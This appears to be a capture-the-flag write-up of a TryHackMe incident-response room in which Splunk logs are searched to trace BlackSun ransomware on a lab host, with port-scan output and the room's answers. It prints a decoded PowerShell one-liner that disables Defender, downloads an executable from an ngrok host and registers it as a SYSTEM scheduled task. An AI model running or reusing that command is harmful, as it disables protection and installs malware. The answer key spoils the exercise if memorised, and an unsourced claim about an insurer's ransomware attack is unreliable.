----
Use Splunk to investigate the ransomware activity.
----

![](https://assets.tryhackme.com/additional/pseclipse/pseclipse-banner.png)

###  Ransomware or not

 Start Machine

![](https://assets.tryhackme.com/additional/jrsecanalyst/task2.png)

  

Scenario: You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called **TryNotHackMe**.

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on **Monday, May 16th, 2022**. The client noted that **the machine** is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device. 

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan's device. 

Happy Hunting!

---

Virtual Machine

You can use the Attack Box or OpenVPN to access the Splunk instance. The IP for the Splunk instance is **MACHINE_IP**. 

**Note**: Wait for the virtual machine to fully load. If you see errors after 2 minutes, refresh the URL until it loads. 

Answer the questions below

```
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ rustscan -a 10.10.11.55 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.55:22
Open 10.10.11.55:80
Open 10.10.11.55:8000
Open 10.10.11.55:8089
Open 10.10.11.55:8191
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 13:00 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:00
Completed Parallel DNS resolution of 1 host. at 13:00, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:00
Scanning 10.10.11.55 [5 ports]
Discovered open port 80/tcp on 10.10.11.55
Discovered open port 22/tcp on 10.10.11.55
Discovered open port 8000/tcp on 10.10.11.55
Discovered open port 8191/tcp on 10.10.11.55
Discovered open port 8089/tcp on 10.10.11.55
Completed Connect Scan at 13:00, 0.19s elapsed (5 total ports)
Initiating Service scan at 13:00
Scanning 5 services on 10.10.11.55
Completed Service scan at 13:01, 57.96s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.11.55.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 13.91s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 1.66s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
Nmap scan report for 10.10.11.55
Host is up, received user-set (0.19s latency).
Scanned at 2023-03-24 13:00:20 EDT for 74s

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0f4a03b59f57ffd9cd3997635365db37 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNC6+970n3M250AiR0FqkTC3w6k5zC7iwHQVHcHATn6+DyY1BBWJnQBlntAhhY5YpnKJ3peXeqdouGEeU+NE20+OMrDllyoJolUm60go+bM5bcJA/rMVD4JA2J4l6Xluwexqc9d+vDqK4SO27ycdxVJufTPyEMJ4/37ZIdcsNPdFxQyL9/+0A0pFRz5tq81Zm7PB8A6T2NRe0Cq50lMv853cvGNcMx1Yv3hOZAwy4DyKy4QS2fWoVW/nq+Oc6UZRhTqbeCY7kgj79fuxIbExWSld3En23gSSVYZ5ANV2A4EcE9yqiCAHugbMizdaeRJ5ivnE0un0vPASKMxNlQDPF/
|   256 cbdaa6449a97349fd86d329569cc93dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEbXOczH4xup4ZMfTGVRI3DYdldRpXazlf7X7JDGOQH4ImKMh3FxJO5R4GT44loPZGjxqgw04cpRnCFK0DJ+/m8=
|   256 1d768bbeaed28b891d32eacb0ceb7a53 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM/VWGh77+ZLgP0ziqeos/YQ6k/CJzxVUrRH5kA7e+Jj
80/tcp   open  http            syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: ERROR: Script execution failed (use -d to debug)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.55/en-US/account/login?return_to=%2Fen-US%2F
8000/tcp open  http            syn-ack Splunkd httpd
|_http-server-header: Splunkd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.55:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8089/tcp open  ssl/http        syn-ack Splunkd httpd (free license; remote login disabled)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-27T05:01:07
| Not valid after:  2024-12-26T05:01:07
| MD5:   2b3bc2a1bbc0fe827050fa0f1a6f3445
| SHA-1: 6d3308dc5df283707f23813b7bb5dd315bb1505c
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQDKwxvgbZblRTANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yMTEyMjcwNTAxMDdaFw0yNDEyMjYwNTAx
| MDdaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA06sj
| P1jt4gQKBf5Snzrjd52aFR/ciERPxRoZCIWNRC8AXnTH9x+eZR05mU5f3Yw+MVj7
| gq/KKIwOifISTqg3JdtIIlbBrkCwR+4MqZ1XKmncR4Bf7ROQuTq7Po4qvRbXFtx2
| umj/oE1opLyH5iwkgx4zohxmM9LjZEdk1Q+XEgNrzT9rQW3W0IIqnVRw6ycBqLaM
| odGFFvmO/aGqgULIhd7cSED4fRq3em1CHIYRF6ANkywmioBIDnIA2nCezwjK6qZJ
| 1jG50MCsUX6whf5UbQAsLo1VCsNcgyxfoPZmToLs1IXUdMYhZNR4ikEf8dM4Islb
| bdmNeGujU9UsjdmFnQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQBx2H7BOVrBoqzg
| Nb7BFI6qWnHf/EuaIgoUXQAKoh0zqVVHOfbIUNy8png1/KWhYDZ3h0o3clih2COr
| llkBsqPQGlV7XWhaGDS2gJdwxcgj8fhKYQuIYbUf9Q1C5BcPxBFVW/sVoClbhDn1
| sMfvStkUJk6s6uc1HnfjB0+8OltYlkmCk2eM5MKzP4DHe9d/Jr3cojtT5d3/XqOj
| i83AvyB4MAJKXnU2PFbVGx01ktk8CnlW8lw2Q/V1VRDMc1GdA0YxYDvmWAh2fASo
| sA/Oi//zVqYWKKZ3HcwHaztf0IDZu1OFTH6m7d1XVchAzS8mOOTKSZDOiLIM3RjW
| rgeK2V3r
|_-----END CERTIFICATE-----
8191/tcp open  limnerpressure? syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|_    looks like you are trying to access MongoDB over HTTP on the native driver port.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8191-TCP:V=7.93%I=7%D=3/24%Time=641DD730%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A9,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-
SF:Type:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like
SF:\x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20
SF:on\x20the\x20native\x20driver\x20port\.\r\n")%r(FourOhFourRequest,A9,"H
SF:TTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20text/
SF:plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x20are
SF:\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the\x20n
SF:ative\x20driver\x20port\.\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.38 seconds

Search : * Between: 05/16/2022 and 06/16/2022

 4,921 events (5/16/22 12:00:00.000 AM to 5/18/22 12:00:00.000 AM

Interesting Fields

C:\Windows\Temp\OUTSTANDING_GUTTER.exe

search powershell.exe

add field commandline

powershell.exe -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA

from base64, remove null bytes

Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"

defang url: hxxp[://]886e-181-215-214-32[.]ngrok[.]io

search OUTSTANDING_GUTTER.exe

fields commandline

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8

same search powershell.exe

"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f

search OUTSTANDING_GUTTER.exe

User: NT AUTHORITY\SYSTEM

"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe

add filter QueryName

9030-181-215-214-32.ngrok.io defanging url

search .ps1

C:\Windows\Temp\script.ps1

search TargetFilename="C:\\Windows\\Temp\\script.ps1"

look for hashes field

SHA1=E0AFCF804394ABD43AD4723A0FEB147F10E589CD,MD5=3EBAB71CB71CA5C475202F401DE008C8,SHA256=E5429F2E44990B3D4E249C566FBF19741E671C0E40B809F87248D9EC9114BEF9,IMPHASH=00000000000000000000000000000000

search on virustotal

This indicator was mentioned in a report.  
  
🔎 Title: BlackSun Ransomware – The Dark Side of PowerShell  
📑 Reference: https://blogs.vmware.com/security/2022/01/blacksun-ransomware-the-dark-side-of-powershell.html  
📆 Report Publish Date: 2022-01-27  
📤 Sample Upload Date: 2021-09-20  
🏷️ Reference ID: #7cbb9afad (https://www.virustotal.com/gui/search/7cbb9afad/comments for report's related indicators)

Go to details 
Names

-   523.mal
 -   BlackSun.ps1

Black Sun is a type of ransomware that encrypts a victim's files and demands payment in exchange for the decryption key. It was first discovered in 2021 and is known for its use of sophisticated encryption algorithms and evasion techniques.

When a system is infected with Black Sun ransomware, the files on the computer or server are encrypted with a strong encryption algorithm. The attackers then demand payment in exchange for the decryption key that can unlock the encrypted files. Victims are typically given a deadline to pay the ransom, and if they fail to do so, the attackers threaten to delete the decryption key, making it impossible to recover the files.

One example of a Black Sun ransomware attack is the one that targeted the New Zealand based insurance company, Tower Insurance in August 2021. The attackers demanded a ransom of $2 million in Bitcoin, threatening to release sensitive data stolen from the company's systems if the ransom was not paid. Tower Insurance declined to pay the ransom and worked with law enforcement agencies to investigate the attack and restore their systems.

search .txt

TargetFilename: C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt

05/16/2022 06:39:30 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=11
EventType=4
ComputerName=DESKTOP-TBV8NEF
User=NOT_TRANSLATED
Sid=S-1-5-18
SidType=0
SourceName=Microsoft-Windows-Sysmon
Type=Information
RecordNumber=7283
Keywords=None
TaskCategory=File created (rule: FileCreate)
OpCode=Info
Message=File created:
RuleName: -
UtcTime: 2022-05-16 13:39:30.399
ProcessGuid: {eea302a0-540e-6282-620f-000000000300}
ProcessId: 4284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
CreationUtcTime: 2022-05-16 13:39:30.399
User: NT AUTHORITY\SYSTEM

search .jpg or just BlackSun

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Public\Pictures\blacksun.jpg
CreationUtcTime: 2022-05-16 13:39:31.514
User: NT AUTHORITY\SYSTEM

```

A suspicious binary was downloaded to the endpoint. What was the name of the binary?

*OUTSTANDING_GUTTER.exe*

What is the address the binary was downloaded from? Add **http://** to your answer & defang the URL.  

Cyberchef can help with defanging the URL.

	*hxxp[://]886e-181-215-214-32[.]ngrok[.]io*

What Windows executable was used to download the suspicious binary? Enter full path.

	*C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe*

What command was executed to configure the suspicious binary to run with elevated privileges?  

Event Code 12 will help here. Note that the attacker tried multiple attempts to configure this command correctly

	*"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f*

What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? **(Format:** **User + ; + CommandLine)**  

	*NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe*

The suspicious binary connected to a remote server. What address did it connect to? Add **http://** to your answer & defang the URL.  

Cyberchef can help with defanging the URL.

	*hxxp[://]9030-181-215-214-32[.]ngrok[.]io*

A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?  

*script.ps1*

The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?  

Check VirusTotal for the hash of the PowerShell script.

*BlackSun.ps1*

A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?  

	*C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt*

The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?

	*C:\Users\Public\Pictures\blacksun.jpg*

[[NahamStore]]